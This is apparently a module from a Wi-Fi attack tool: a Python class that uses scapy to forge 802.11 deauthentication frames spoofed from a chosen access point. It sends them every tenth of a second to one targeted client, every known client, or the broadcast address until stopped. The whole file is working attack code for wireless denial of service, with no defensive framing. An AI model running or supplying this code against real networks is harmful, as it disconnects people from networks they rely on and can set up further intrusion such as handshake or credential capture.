import time
import scapy.all as scapy
import globals
import threading

class DeauthAttack:
    def __init__(self):
        self.IFACE = globals.interface
        self._stop_event = threading.Event()
    def stop(self):
        self._stop_event.set()

    def build_deauth_packet(self, client):
        packet = (scapy.RadioTap()/
                scapy.Dot11(type=0, 
                            subtype=12, 
                            addr1=client, 
                            addr2=globals.selected_bssid, 
                            addr3=globals.selected_bssid)/
                scapy.Dot11Deauth(reason=7)
        )
        return packet
    
    def start_deauth(self):
        while not self._stop_event.is_set():
            if globals.selected_client:
                try:
                    pkt = self.build_deauth_packet(globals.selected_client)
                    scapy.sendp(pkt, iface=self.IFACE, verbose=False)
                    time.sleep(0.1)
                except Exception as e:
                    time.sleep(0.1)
            else:
                targets = globals.clients if globals.clients else ["ff:ff:ff:ff:ff:ff"]
                for client in targets:
                    try:
                        if self._stop_event.is_set():
                            return
                        pkt = self.build_deauth_packet(client)
                        scapy.sendp(pkt, iface=self.IFACE, verbose=False)
                        time.sleep(0.1)
                    except Exception as e:
                        time.sleep(0.1)